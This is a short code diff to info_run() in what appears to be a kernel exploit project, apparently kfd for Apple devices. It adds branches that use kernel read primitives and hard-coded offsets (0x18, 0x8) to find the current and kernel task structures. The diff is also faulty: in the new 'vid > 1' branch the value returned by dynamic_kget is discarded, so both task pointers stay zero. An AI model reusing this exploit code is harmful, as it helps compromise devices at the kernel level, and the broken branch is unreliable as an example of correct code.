@@ -258,7 +258,15 @@ void info_run(struct kfd* kfd)
      * current_proc() and current_task()
      */
     assert(kfd->info.kernel.current_proc);
-    u64 signed_task_kaddr = dynamic_kget(proc, task, kfd->info.kernel.current_proc);
+    u64 signed_task_kaddr = 0;
+    if (kfd->info.env.vid > 1) {
+        dynamic_kget(proc, task, kfd->info.kernel.current_proc);
+    } else {
+        u64 proc_ro = 0;
+        kread((u64)kfd, kfd->info.kernel.current_proc + 0x18, &proc_ro, 8);
+        printf("proc_ro = 0x%llx\n", proc_ro);
+        kread((u64)kfd, proc_ro + 0x8, &signed_task_kaddr, 8);
+    }
     kfd->info.kernel.current_task = unsign_kaddr(signed_task_kaddr);
     print_x64(kfd->info.kernel.current_proc);
     print_x64(kfd->info.kernel.current_task);
@@ -304,7 +312,15 @@ void info_run(struct kfd* kfd)
         /*
          * kernel_proc() and kernel_task()
          */
-        u64 signed_kernel_task = dynamic_kget(proc, task, kfd->info.kernel.kernel_proc);
+        u64 signed_kernel_task = 0;
+        if (kfd->info.env.vid > 1) {
+            dynamic_kget(proc, task, kfd->info.kernel.kernel_proc);
+        } else {
+            uint64_t proc_ro = 0;
+            kread((u64)kfd, kfd->info.kernel.kernel_proc + 0x18, &proc_ro, 8);
+            printf("proc_ro = 0x%llx\n", proc_ro);
+            kread((u64)kfd, proc_ro + 0x8, &signed_kernel_task, 8);
+        }
         kfd->info.kernel.kernel_task = unsign_kaddr(signed_kernel_task);
         print_x64(kfd->info.kernel.kernel_proc);
         print_x64(kfd->info.kernel.kernel_task);
